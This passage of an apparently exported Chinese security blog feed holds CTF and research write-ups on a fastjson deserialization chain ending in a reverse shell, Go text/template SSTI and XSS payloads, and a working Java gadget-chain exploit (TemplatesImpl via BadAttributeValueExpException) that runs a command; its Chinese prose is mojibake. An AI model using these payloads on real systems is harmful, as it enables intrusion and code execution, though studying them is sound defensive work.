                    alt="image-20230505021125948"                ><figcaption>image-20230505021125948</figcaption></figure></p><blockquote><p>è¿™ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œé‚£ä¸ªå¼‚å¸¸æç¤ºçš„å¾ˆæ˜æ˜¾äº†<code>default constructor not found. class xxx</code>è€ŒMyBeanæ˜æ˜¾æ˜¯æœ‰æ— å‚æ„é€ æ–¹æ³•çš„ï¼Œè¿™é‡Œçš„defaultConstructorå°±æ˜¯è·å–åˆ°äº†æ— å‚æ„é€ æ–¹æ³•</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050238509.png"                      alt="image-20230505015849391"                ><figcaption>image-20230505015849391</figcaption></figure></p></blockquote><p>æ²¡æœ‰å¼‚å¸¸æŠ›å‡ºï¼Œæ— äº‹å‘ç”Ÿï¼Œæ¥ç€è½®åˆ°RMIConnector</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050247946.png"                      alt="image-20230505021320328"                ><figcaption>image-20230505021320328</figcaption></figure></p><p>åé¢éƒ½æ˜¯ä¸€æ ·çš„æ“ä½œï¼Œä¸‰ä¸ªæ–¹æ³•éƒ½æ‰¾ä¸åˆ°ç±»ï¼Œè¢«æ·»åŠ è¿›mappingsï¼Œsize+1</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050238031.png"                      alt="image-20230505021419699"                ><figcaption>image-20230505021419699</figcaption></figure></p><p>ç„¶åæ¥åˆ°æ­»äº¡å¼‚å¸¸æŠ›å‡ºç‚¹JavaBeanInfoçš„buildæ–¹æ³•ï¼Œæ²¡æœ‰æ— å‚æ„é€ å‡½æ•°</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050238335.png"                      alt="image-20230505021538934"                ><figcaption>image-20230505021538934</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239359.png"                      alt="image-20230505021549225"                ><figcaption>image-20230505021549225</figcaption></figure></p><p>è¿æ¥ç¬¬ä¸€æ¬¡æŠ¥é”™</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239280.png"                      alt="image-20230505021625294"                ><figcaption>image-20230505021625294</figcaption></figure></p><h3 id="ç¬¬äºŒæ¬¡ååºåˆ—åŒ–"><a href="#ç¬¬äºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="ç¬¬äºŒæ¬¡ååºåˆ—åŒ–"></a>ç¬¬äºŒæ¬¡ååºåˆ—åŒ–</h3><p>æ¥ç€è¿›è¡Œç¬¬äºŒæ¬¡ï¼Œå‘é€payload</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239992.png"                      alt="image-20230505021702771"                ><figcaption>image-20230505021702771</figcaption></figure></p><p>MyBeanå’ŒRMIConnectorçš„checkAutoTypeå°±å…ˆè·³è¿‡ï¼Œè¿™ä¸¤ç±»ä»¥åŠè¢«åŠ å…¥mappingsäº†ï¼Œæ˜¯å¯ä»¥é€šè¿‡ä¸‰ä¸ªæ–¹æ³•åçš„è¿™éƒ¨åˆ†ä»£ç æå‰é€€å‡ºçš„,å°±ä¸å†è·Ÿè¿›</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ç›´æ¥å¼€å§‹åˆ†æJMXServiceURLï¼Œä¸‰ä¸ªæ–¹æ³•æ‰¾ä¸åˆ°ç±»ï¼Œè°ƒç”¨laodClass</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239172.png"                      alt="image-20230505021939903"                ><figcaption>image-20230505021939903</figcaption></figure></p><p>åŠ å…¥mappingsï¼Œ size+1ï¼Œè‡³æ­¤ï¼Œå¯ä»¥æ”¯æŒååºåˆ—åŒ–æˆåŠŸçš„mappignså·²ç»è£…å¡«å¥½</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239392.png"                      alt="image-20230505022008745"                ><figcaption>image-20230505022008745</figcaption></figure></p><p>ä¹‹ååˆå› ä¸ºæ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•æŠ›å‡ºå¼‚å¸¸</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239543.png"                      alt="image-20230505022107758"                ><figcaption>image-20230505022107758</figcaption></figure></p><p>è¿æ¥ç¬¬äºŒä¸ªæŠ¥é”™</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239596.png"                      alt="image-20230505022142322"                ><figcaption>image-20230505022142322</figcaption></figure></p><h3 id="ç¬¬ä¸‰æ¬¡ååºåˆ—åŒ–ï¼ˆä¹Ÿæ˜¯ååºåˆ—åŒ–æˆåŠŸçš„å¼€å§‹ï¼‰"><a href="#ç¬¬ä¸‰æ¬¡ååºåˆ—åŒ–ï¼ˆä¹Ÿæ˜¯ååºåˆ—åŒ–æˆåŠŸçš„å¼€å§‹ï¼‰" class="headerlink" title="ç¬¬ä¸‰æ¬¡ååºåˆ—åŒ–ï¼ˆä¹Ÿæ˜¯ååºåˆ—åŒ–æˆåŠŸçš„å¼€å§‹ï¼‰"></a>ç¬¬ä¸‰æ¬¡ååºåˆ—åŒ–ï¼ˆä¹Ÿæ˜¯ååºåˆ—åŒ–æˆåŠŸçš„å¼€å§‹ï¼‰</h3><p>å…ˆæå‰æ¶èµ·ldapæœåŠ¡å’Œvpsç›‘å¬</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239279.png"                      alt="image-20230505022409515"                ><figcaption>image-20230505022409515</figcaption></figure></p><p>å‘é€payload</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050240664.png"                      alt="image-20230505022432324"                ><figcaption>image-20230505022432324</figcaption></figure></p><p>é€šè¿‡äº†å‰é¢ä¸‰ä¸ªç±»çš„checkAutoTypeæ–¹æ³•ï¼Œæ¥åˆ°BadAttributeValueExpExceptionçš„readObjectæ–¹æ³•</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050240513.png"                      alt="image-20230505022631154"                ><figcaption>image-20230505022631154</figcaption></figure></p><p>æ¥ç€è§¦å‘getter</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050240832.png"                      alt="image-20230505022649684"                ><figcaption>image-20230505022649684</figcaption></figure></p><p>æˆåŠŸåå¼¹shell</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050240730.png"                      alt="image-20230505022721373"                ><figcaption>image-20230505022721373</figcaption></figure></p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GO SSTI</title>
      <link href="/2023/03/13/GO-SSTI/"/>
      <url>/2023/03/13/GO-SSTI/</url>
      
        <content type="html"><![CDATA[<h1 id="GO-SSTI"><a href="#GO-SSTI" class="headerlink" title="GO SSTI"></a>GO SSTI</h1><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="è¯†åˆ«æ–¹æ³•"><a href="#è¯†åˆ«æ–¹æ³•" class="headerlink" title="è¯†åˆ«æ–¹æ³•"></a>è¯†åˆ«æ–¹æ³•</h3><p>ä»£ç ä¸­å¼•å…¥äº†<code>text/template</code>ï¼Œä¼šå¯¼è‡´SSTIæ¼æ´å‡ºç°</p><p>è¿ç®—ç¬¦å·åœ¨<code>&#123;&#123;&#125;&#125;</code>ä¸­æ˜¯éæ³•çš„ï¼Œéœ€è¦ä½¿ç”¨å…¶ä»–payloadï¼Œæ¯”å¦‚å ä½ç¬¦å·<code>&#123;&#123;.&#125;&#125;</code>,å¦‚æœå­˜åœ¨sstiï¼Œé‚£ä¹ˆå°±æ— å›æ˜¾</p><h3 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h3><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;text/template&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Id     <span class="type">int</span></span><br><span class="line">Name   <span class="type">string</span></span><br><span class="line">Passwd <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StringTplExam</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := &amp;User&#123;<span class="number">1</span>, <span class="string">&quot;tyskill&quot;</span>, <span class="string">&quot;tyskill&quot;</span>&#125;</span><br><span class="line">r.ParseForm()</span><br><span class="line">arg := strings.Join(r.PostForm[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;&quot;</span>)</span><br><span class="line">tpl1 := fmt.Sprintf(<span class="string">`&lt;h1&gt;Hi, `</span> + arg + <span class="string">`&lt;/h1&gt; Your name is &#123;&#123; .Name &#125;&#125;`</span>)</span><br><span class="line">html, err := template.New(<span class="string">&quot;login&quot;</span>).Parse(tpl1)</span><br><span class="line">html = template.Must(html, err)</span><br><span class="line">html.Execute(w, user)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">server := http.Server&#123;</span><br><span class="line">Addr: <span class="string">&quot;127.0.0.1:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/string&quot;</span>, StringTplExam)</span><br><span class="line">server.ListenAndServe()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>goé€šè¿‡ç»“æ„ä½“æ¥ç±»æ¯”ä¸€ä¸ªå¯¹è±¡ï¼Œä¸€ä¸ªå­æ®µå°±æ˜¯ä¸€ä¸ªå¯¹è±¡çš„å±æ€§ï¼Œæ¨¡ç‰ˆæ¸²æŸ“ä¹Ÿæ”¯æŒä¼ å…¥ä¸€ä¸ªç»“æ„ä½“çš„å®ä¾‹æ¥æ¸²æŸ“å­—æ®µï¼Œä¸Šé¢ä»£ç ä¸­ï¼Œnameéƒ¨åˆ†å¯æ§ï¼Œå¯ä»¥ä»¿é€ <code>&#123;&#123; .Name&#125;&#125;</code>ï¼Œæ„é€ <code>&#123;&#123;.Passw&#125;&#125;</code>ï¼Œå¾—åˆ°Passwdå­—æ®µ</p><p><code>user := &amp;User&#123;1, &quot;tyskill&quot;, &quot;tyskill&quot;&#125;</code>ä½¿ç”¨äº†æ¨¡ç‰ˆ<code>&amp;User</code>å› æ­¤<code>&#123;&#123;.Passwd&#125;&#125;</code>å¯ä»¥å¾—åˆ°å®ƒçš„å±æ€§</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032243822.png"                      alt="image-20230413215152150"                ><figcaption>image-20230413215152150</figcaption></figure></p><p>ç›´æ¥ç”¨.å¯ä»¥å¾—åˆ°æ¨¡ç‰ˆçš„å…¨éƒ¨å†…å®¹</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032244524.png"                      alt="image-20230413215255743"                ><figcaption>image-20230413215255743</figcaption></figure></p><h3 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><p>æ‹’ç»æ‹¼æ¥ï¼Œç›´æ¥ä¼ å…¥.å­—æ®µå</p><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StringTpl2Exam</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := &amp;User&#123;<span class="number">1</span>, <span class="string">&quot;tyskill&quot;</span>, <span class="string">&quot;tyskill&quot;</span>&#125;</span><br><span class="line">r.ParseForm()</span><br><span class="line">arg := strings.Join(r.PostForm[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;&quot;</span>)</span><br><span class="line">tpl := <span class="string">`&lt;h1&gt;Hi, &#123;&#123; .arg &#125;&#125;&lt;/h1&gt;&lt;br&gt;Your name is &#123;&#123; .Name &#125;&#125;`</span></span><br><span class="line">data := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;arg&quot;</span>:  arg,</span><br><span class="line"><span class="string">&quot;Name&quot;</span>: user.Name,</span><br><span class="line">&#125;</span><br><span class="line">html := template.Must(template.New(<span class="string">&quot;login&quot;</span>).Parse(tpl))</span><br><span class="line">html.Execute(w, data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>goæ¨¡ç‰ˆä¼šæ‰“å°å­—ç¬¦ä¸²ï¼Œå¦‚æœæ˜¯xssä»£ç çš„è¯ï¼Œä¹Ÿä¼šç›´æ¥æ‰§è¡Œï¼Œè¿™ä¸ªxssæ˜¯æ‹’ç»æ‹¼æ¥ä¹Ÿæ— æ³•é˜²å¾¡çš„</p><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="built_in">print</span> <span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>ç¼–ç è¡Œä¸º</p><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;define <span class="string">&quot;T1&quot;</span>&#125;&#125;ONE&#123;&#123;end&#125;&#125;&#123;&#123;template <span class="string">&quot;T1&quot;</span>&#125;&#125;</span><br><span class="line">å³&#123;&#123;define <span class="string">&quot;T1&quot;</span>&#125;&#125;&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;&#123;&#123;end&#125;&#125; &#123;&#123;template <span class="string">&quot;T1&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure></div><ul><li><code>&#123;template &quot;name&quot;&#125;&#125;</code> æ‰§è¡Œåä¸ºnameçš„æ¨¡æ¿ï¼Œæä¾›ç»™æ¨¡æ¿çš„å‚æ•°ä¸ºnilï¼Œå¦‚æ¨¡æ¿ä¸å­˜åœ¨è¾“å‡ºä¸ºâ€â€</li><li><code>&#123;&#123;define "name"&#125;`æ¨¡æ¿å†…å®¹`&#123;&#123;end&#125;&#125;&#125;</code>å®šä¹‰ä¸€ä¸ªåä¸ºnameçš„æ¨¡æ¿</li></ul><p>è¿™é‡Œå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªæˆ‘ä»¬è¿›è¡Œæ¨¡æ¿çš„å®šä¹‰ï¼Œå¹¶è¾“å‡ºçš„è¿‡ç¨‹ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é¡ºåˆ©çš„å®ç°XSSäº†</p><h3 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h3><p>1.å†…ç½®å‡½æ•°htmlè½¬ä¹‰ç‰¹æ®Šå­—ç¬¦</p><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;html <span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>&#125;&#125;</span><br><span class="line">&#123;&#123;js <span class="string">&quot;jsä»£ç &quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>2.<code>text/template</code>åœ¨æ¨¡ç‰ˆå¤„ç†é˜¶æ®µè¿˜å®šä¹‰<code>template.HTMLEscapeString</code>ç­‰è½¬ä¹‰å‡½æ•°</p><p>3.<code>html/template</code>æ¨¡ç‰ˆåŒ…è‡ªå¸¦è½¬ä¹‰æ•ˆæœ</p><h2 id="å‘½ä»¤æ‰§è¡Œ-amp-ä»»æ„æ–‡ä»¶è¯»å–"><a href="#å‘½ä»¤æ‰§è¡Œ-amp-ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ&amp;ä»»æ„æ–‡ä»¶è¯»å–"></a>å‘½ä»¤æ‰§è¡Œ&amp;ä»»æ„æ–‡ä»¶è¯»å–</h2><p>å¯ä»¥åƒ<code>&#123;&#123; .Name&#125;&#125;</code>ä¸€æ ·è°ƒç”¨å¯¹è±¡æ–¹æ³•ï¼Œæ¨¡æ¿å†…éƒ¨å¹¶ä¸å­˜åœ¨å¯ä»¥RCEçš„å‡½æ•°ï¼Œæ‰€ä»¥é™¤éæœ‰äººä¸ºæ¸²æŸ“å¯¹è±¡å®šä¹‰äº†RCEæˆ–æ–‡ä»¶è¯»å–çš„æ–¹æ³•ï¼Œä¸ç„¶è¿™ä¸ªé—®é¢˜æ˜¯ä¸å­˜åœ¨çš„ã€‚</p><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> System(cmd <span class="type">string</span>, arg ...<span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line">out, _ := exec.Command(cmd, arg...).CombinedOutput()</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> FileRead(File <span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line">data, err := ioutil.ReadFile(File)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Print(<span class="string">&quot;File read error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>å¦‚æœå®šä¹‰äº†å°±å¯ä»¥é€šè¿‡<code>&#123;&#123;.System "whoami"&#125;&#125;</code>å’Œ<code>&#123;&#123;.FileRead "filepath"&#125;&#125;</code>æ‰§è¡Œ</p><blockquote><p>æ­£å¸¸ç¨‹åºçŒ¿éƒ½ä¸ä¼šå®šä¹‰è¿™ä¹ˆå±é™©çš„å‡½æ•°</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastJsonä¸åŸç”Ÿååºåˆ—åŒ–</title>
      <link href="/2023/02/04/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/02/04/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="FastJsonä¸åŸç”Ÿååºåˆ—åŒ–"><a href="#FastJsonä¸åŸç”Ÿååºåˆ—åŒ–" class="headerlink" title="FastJsonä¸åŸç”Ÿååºåˆ—åŒ–"></a>FastJsonä¸åŸç”Ÿååºåˆ—åŒ–</h1><h2 id="ç¬¬ä¸€ç‰ˆ-lt-1-2-49"><a href="#ç¬¬ä¸€ç‰ˆ-lt-1-2-49" class="headerlink" title="ç¬¬ä¸€ç‰ˆ &lt;1.2.49"></a>ç¬¬ä¸€ç‰ˆ &lt;1.2.49</h2><p>åœ¨Jsonç±»å½“ä¸­çš„toStringæ–¹æ³•èƒ½è§¦å‘toJsonStringçš„è°ƒç”¨ï¼Œè€Œè¿™ä¸ªä¸œè¥¿å…¶å®æˆ‘ä»¬å¹¶ä¸é™Œç”Ÿï¼Œåœ¨æˆ‘ä»¬æƒ³ç”¨JSON.parse()è§¦å‘getæ–¹æ³•æ—¶ï¼Œå…¶ä¸­ä¸€ä¸ªå¤„ç†æ–¹æ³•å°±æ˜¯ç”¨JSONObjectåµŒå¥—æˆ‘ä»¬çš„payload</p><p>è§¦å‘toString-&gt;toJSONString-&gt;getæ–¹æ³•</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032239697.png"                      alt="image-20230421235341029"                ><figcaption>image-20230421235341029</figcaption></figure></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;y4tacker&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title 